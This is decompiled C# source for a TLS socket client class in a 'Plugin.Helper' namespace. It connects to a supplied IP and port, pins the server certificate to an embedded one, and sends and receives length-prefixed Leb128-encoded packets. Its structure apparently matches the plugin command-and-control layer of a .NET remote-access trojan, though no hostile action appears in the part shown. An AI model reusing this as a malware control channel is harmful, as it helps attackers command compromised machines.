using System;
using System.IO;
using System.Net.Security;
using System.Net.Sockets;
using System.Security.Authentication;
using System.Security.Cryptography.X509Certificates;
using Leb128;

namespace Plugin.Helper
{
	// Token: 0x02000082 RID: 130
	public class Client
	{
		// Token: 0x06000209 RID: 521 RVA: 0x0001A5E4 File Offset: 0x000187E4
		public static void Connect(string ip, string port)
		{
			try
			{
				Client.socket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
				Client.socket.ReceiveBufferSize = 10240;
				Client.socket.SendBufferSize = 10240;
				Client.socket.Connect(ip, Convert.ToInt32(port));
				bool connected = Client.socket.Connected;
				if (connected)
				{
					Client.itsConnect = true;
					Client.SendSync = new object();
					Stream innerStream = new NetworkStream(Client.socket, true);
					bool leaveInnerStreamOpen = false;
					Client.SslClient = new SslStream(innerStream, leaveInnerStreamOpen, new RemoteCertificateValidationCallback(Client.ValidateServerCertificate));
					
					int timeout = 3000;
					Client.SslClient.ReadTimeout = timeout;
					Client.SslClient.WriteTimeout = timeout;
					
					string hostName = Client.socket.RemoteEndPoint.ToString().Split(new char[]
					{
						':'
					})[0];
					
					IAsyncResult sslResult = Client.SslClient.BeginAuthenticateAsClient(
						hostName, 
						null, 
						SslProtocols.Tls12, 
						false, 
						null, 
						null);
					
					if (!sslResult.AsyncWaitHandle.WaitOne(timeout, false))
					{
						Client.Disconnect();
						return;
					}
					
					Client.SslClient.EndAuthenticateAsClient(sslResult);
					
					Client.Offset = 0;
					Client.HeaderSize = 4;
					Client.ClientBuffer = new byte[Client.HeaderSize];
					Client.ClientBufferRecevied = false;
					Client.SslClient.BeginRead(Client.ClientBuffer, Client.Offset, Client.HeaderSize, new AsyncCallback(Client.ReadData), null);
				}
			}
			catch (Exception ex)
			{
				Console.WriteLine(ex.ToString());
				Client.Disconnect();
			}
		}

		// Token: 0x0600020A RID: 522 RVA: 0x0001A748 File Offset: 0x00018948
		private static bool ValidateServerCertificate(object sender, X509Certificate certificate, X509Chain chain, SslPolicyErrors sslPolicyErrors)
		{
			return Plugin.X509Certificate2.Equals(certificate);
		}

		// Token: 0x0600020B RID: 523 RVA: 0x0001A768 File Offset: 0x00018968
		public static void Disconnect()
		{
			bool flag = Client.itsConnect;
			if (flag)
			{
				Client.itsConnect = false;
				Client.ClientBuffer = null;
				Client.HeaderSize = 0;
				Client.Offset = 0;
				bool flag2 = Client.socket != null;
				if (flag2)
				{
					Client.socket.Dispose();
				}
				bool flag3 = Client.SslClient != null;
				if (flag3)
				{
					Client.SslClient.Dispose();
				}
			}
		}

		// Token: 0x0600020C RID: 524 RVA: 0x0001A7CC File Offset: 0x000189CC
		public static void ReadData(IAsyncResult ar)
		{
			bool flag = !Client.itsConnect;
			if (!flag)
			{
				try
				{
					int num = Client.SslClient.EndRead(ar);
					bool flag2 = num > 0;
					if (flag2)
					{
						Client.HeaderSize -= num;
						Client.Offset += num;
						bool flag3 = !Client.ClientBufferRecevied;
						if (flag3)
						{
							bool flag4 = Client.HeaderSize == 0;
							if (flag4)
							{
								Client.HeaderSize = BitConverter.ToInt32(Client.ClientBuffer, 0);
								bool flag5 = Client.HeaderSize > 0;
								if (flag5)
								{
									Client.ClientBuffer = new byte[Client.HeaderSize];
									Client.Offset = 0;
									Client.ClientBufferRecevied = true;
								}
							}
							else
							{
								bool flag6 = Client.HeaderSize < 0;
								if (flag6)
								{
									Client.Disconnect();
									return;
								}
							}
						}
						else
						{
							bool flag7 = Client.HeaderSize == 0;
							if (flag7)
							{
								Packet.Read(Client.ClientBuffer);
								Client.Offset = 0;
								Client.HeaderSize = 4;
								Client.ClientBuffer = new byte[Client.HeaderSize];
								Client.ClientBufferRecevied = false;
							}
							else
							{
								bool flag8 = Client.HeaderSize < 0;
								if (flag8)
								{
									Client.Disconnect();
									return;
								}
							}
						}
						Client.SslClient.BeginRead(Client.ClientBuffer, Client.Offset, Client.HeaderSize, new AsyncCallback(Client.ReadData), null);
					}
					else
					{
						Client.Disconnect();
					}
				}
				catch (Exception ex)
				{
					Console.WriteLine(ex.ToString());
					Client.Disconnect();
				}
			}
		}

		// Token: 0x0600020D RID: 525 RVA: 0x0001A964 File Offset: 0x00018B64
		public static void Error(string exp)
		{
			Client.Send(Leb128.Leb128.Write(new object[]
			{
				"Error",
				exp
			}));
		}

		// Token: 0x0600020E RID: 526 RVA: 0x0001A984 File Offset: 0x00018B84
		public static void Send(byte[] Data)
		{
			bool flag = !Client.itsConnect || Data == null || Data.Length == 0;
			if (!flag)
			{
				object sendSync = Client.SendSync;
				lock (sendSync)
				{
					try
					{
						byte[] bytes = BitConverter.GetBytes(Data.Length);
						Client.socket.Poll(-1, SelectMode.SelectWrite);
						Client.SslClient.Write(bytes, 0, bytes.Length);
						bool flag3 = Data.Length > 51200;
						if (flag3)
						{
							using (MemoryStream memoryStream = new MemoryStream(Data))
							{
								memoryStream.Position = 0L;
								byte[] array = new byte[51200];
								int count;
								while ((count = memoryStream.Read(array, 0, array.Length)) > 0)
								{
									Client.socket.Poll(-1, SelectMode.SelectWrite);
									Client.SslClient.Write(array, 0, count);
									Client.SslClient.Flush();
								}
								return;
							}
						}
						Client.socket.Poll(-1, SelectMode.SelectWrite);
						Client.SslClient.Write(Data, 0, Data.Length);
						Client.SslClient.Flush();
					}
					catch (Exception ex)
					{
						Console.WriteLine(ex.ToString());
						Client.Disconnect();
					}
				}
			}
		}

		// Token: 0x04000083 RID: 131
		public static Socket socket;

		// Token: 0x04000084 RID: 132
		public static SslStream SslClient;

		// Token: 0x04000085 RID: 133
		public static byte[] ClientBuffer;

		// Token: 0x04000086 RID: 134
		public static bool ClientBufferRecevied;

		// Token: 0x04000087 RID: 135
		public static int HeaderSize;

		// Token: 0x04000088 RID: 136
		public static int Offset;

		// Token: 0x04000089 RID: 137
		public static object SendSync;

		// Token: 0x0400008A RID: 138
		public static bool itsConnect;
	}
}
